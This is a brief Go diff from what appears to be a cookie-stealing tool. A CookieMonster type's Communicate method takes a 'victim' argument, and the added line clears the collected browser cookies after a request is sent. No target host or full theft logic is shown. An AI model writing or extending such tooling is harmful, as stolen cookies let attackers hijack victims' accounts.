@@ -34,6 +34,7 @@ func (c *CookieMonster) Communicate(victim string) {
 			if err != nil {
 				fmt.Println("Error sending the request")
 			} else {
+				c.cookies = []*kooky.Cookie{}
 				break
 			}
 		} else {
